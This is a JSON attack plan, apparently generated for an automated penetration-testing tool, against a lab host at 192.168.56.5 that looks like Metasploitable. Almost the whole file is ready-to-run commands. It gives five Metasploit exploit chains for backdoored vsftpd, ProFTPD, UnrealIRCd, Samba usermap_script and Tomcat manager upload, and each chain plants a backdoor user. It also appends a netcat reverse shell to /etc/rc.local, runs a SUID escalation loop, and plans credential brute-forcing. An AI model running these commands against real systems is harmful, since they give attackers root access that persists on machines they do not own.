@@ -1,0 +1,551 @@
+{
+    "target": "192.168.56.5",
+    "summary": [
+        "Multiple vulnerable services identified including vsftpd 2.3.4 backdoor (CVE-2011-2523), ProFTPD 1.3.1 backdoor, Samba usermap script (CVE-2007-2447), UnrealIRCd backdoor (CVE-2010-2075), and Tomcat manager upload vulnerability.",
+        "High-risk exploits available for direct root shell access via backdoors and RCE in web services.",
+        "Weak credentials likely on SSH, Telnet, and databases (e.g., msfadmin:msfadmin)."
+    ],
+    "attack_chains": [
+        {
+            "name": "Chain 1: vsftpd 2.3.4 Backdoor Exploitation",
+            "use_persistent_session": true,
+            "session_name": "vsftpd_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit the vsftpd 2.3.4 backdoor to gain root shell via the hidden listener on port 6200.",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "vsftpd_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "set RPORT 21",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened (root) on 192.168.56.5' in output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Establish persistence by creating a new user and backdoor, then verify with SSH.",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "sessions -i 1",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "useradd -m -s /bin/bash backdoor",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "echo 'backdoor:backdoorpass' | chpasswd",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "echo 'nc -e /bin/bash 192.168.56.2 5555 &' >> /etc/rc.local",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "exit",
+                            "wait": 1
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "vsftpd_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'backdoorpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor@192.168.56.5 'id'",
+                            "wait": 5
+                        }
+                    ],
+                    "verification": "Expect output showing uid=0(root) for persistence verification"
+                }
+            ]
+        },
+        {
+            "name": "Chain 2: ProFTPD 1.3.1 Backdoor Exploitation",
+            "use_persistent_session": true,
+            "session_name": "proftpd_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Trigger the ProFTPD 1.3.1 backdoor to gain root shell.",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "proftpd_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "use exploit/unix/ftp/proftpd_133c_backdoor",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "set RPORT 2121",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened (root) on 192.168.56.5' in output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Add persistent user and backdoor, verify access.",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "sessions -i 1",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "useradd -m -s /bin/bash proftpduser",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "echo 'proftpduser:proftpdpass' | chpasswd",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "echo 'nc -e /bin/bash 192.168.56.2 5556 &' >> /etc/rc.local",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "exit",
+                            "wait": 1
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "proftpd_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'proftpdpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa proftpduser@192.168.56.5 'id'",
+                            "wait": 5
+                        }
+                    ],
+                    "verification": "Expect output showing uid for new user to confirm persistence"
+                }
+            ]
+        },
+        {
+            "name": "Chain 3: Samba Usermap Script Exploitation",
+            "use_persistent_session": true,
+            "session_name": "samba_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit Samba usermap_script vulnerability (CVE-2007-2447) for command execution leading to reverse shell.",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "samba_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "use exploit/multi/samba/usermap_script",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set PAYLOAD cmd/unix/reverse_netcat",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set LHOST 192.168.56.2",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set LPORT 4444",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened' in output"
+                },
+                {
+                    "stage": "privilege_escalation",
+                    "description": "Escalate if needed and establish persistence.",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'id'",
+                            "wait": 3
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'if [ `id -u` -ne 0 ]; then echo \"Escalating...\"; /usr/bin/find / -perm -4000 -type f 2>/dev/null | xargs -I {} /bin/bash -c \"{} -p\" 2>&1; fi'",
+                            "wait": 10
+                        }
+                    ],
+                    "verification": "Look for root privileges or SUID binaries execution output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user and service.",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "useradd -m -s /bin/bash sambaback",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "echo 'sambaback:sambapass' | chpasswd",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "echo 'nc -e /bin/bash 192.168.56.2 5557 &' >> /etc/rc.local",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "exit",
+                            "wait": 1
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "samba_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'sambapass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa sambaback@192.168.56.5 'id'",
+                            "wait": 5
+                        }
+                    ],
+                    "verification": "Successful SSH login indicates persistence"
+                }
+            ]
+        },
+        {
+            "name": "Chain 4: UnrealIRCd Backdoor Exploitation",
+            "use_persistent_session": true,
+            "session_name": "irc_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit UnrealIRCd backdoor (CVE-2010-2075) to gain root shell.",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "irc_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "use exploit/unix/irc/unreal_ircd_3281_backdoor",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set RPORT 6667",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Meterpreter session X opened (root) on 192.168.56.5' or command shell"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Add user for persistent access.",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -i 1",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "useradd -m -s /bin/bash ircback",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "echo 'ircback:ircpass' | chpasswd",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "echo 'nc -e /bin/bash 192.168.56.2 5558 &' >> /etc/rc.local",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "exit",
+                            "wait": 1
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "irc_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'ircpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa ircback@192.168.56.5 'id'",
+                            "wait": 5
+                        }
+                    ],
+                    "verification": "SSH command outputs user details confirming access"
+                }
+            ]
+        },
+        {
+            "name": "Chain 5: Tomcat Manager Upload Exploitation",
+            "use_persistent_session": true,
+            "session_name": "tomcat_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit Tomcat manager upload vulnerability on port 8180 for RCE shell.",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "tomcat_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "use exploit/multi/http/tomcat_mgr_upload",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set RPORT 8180",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set USERNAME tomcat",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set PASSWORD tomcat",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set PAYLOAD cmd/unix/reverse_netcat",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set LHOST 192.168.56.2",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set LPORT 4445",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened' in Metasploit output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Ensure post-exploitation persistence on the system.",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "sessions -i 1",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "useradd -m -s /bin/bash tomback",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "echo 'tomback:tompass' | chpasswd",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "echo 'nc -e /bin/bash 192.168.56.2 5559 &' >> /etc/rc.local",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "exit",
+                            "wait": 1
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "tomcat_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'tompass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa tomback@192.168.56.5 'id'",
+                            "wait": 5
+                        }
+                    ],
+                    "verification": "Verification via SSH id output"
+                }
+            ]
+        }
+    ],
+    "followup_requests": [
+        "Perform credential brute-forcing on SSH, Telnet, VNC, and MySQL using identified weak creds like msfadmin:msfadmin.",
+        "Enumerate and exploit PostgreSQL payload for database access and potential RCE.",
+        "Run detailed Nikto or Gobuster on web paths like /phpMyAdmin/ and /twiki/ for additional RCE vectors."
+    ]
+}
